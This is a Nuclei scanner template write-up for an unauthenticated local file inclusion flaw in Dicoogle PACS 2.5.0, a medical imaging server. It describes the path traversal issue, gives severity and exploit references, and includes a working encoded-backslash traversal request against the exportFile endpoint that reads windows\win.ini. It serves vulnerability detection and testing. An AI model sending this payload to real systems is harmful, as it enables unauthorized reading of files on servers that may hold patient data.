# Nuclei Template: Dicoogle PACS 2.5.0 - Local File Inclusion
**Template ID:** dicoogle-pacs-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`dicoogle-pacs-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Dicoogle PACS 2.5.0 is vulnerable to local file inclusion. This allows an attacker to read arbitrary files that the web user has access to. Admin credentials aren't required.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
```

## References
- https://www.exploit-db.com/exploits/45007
- https://cxsecurity.com/issue/WLB-2018070131
- http://www.dicoogle.com/home
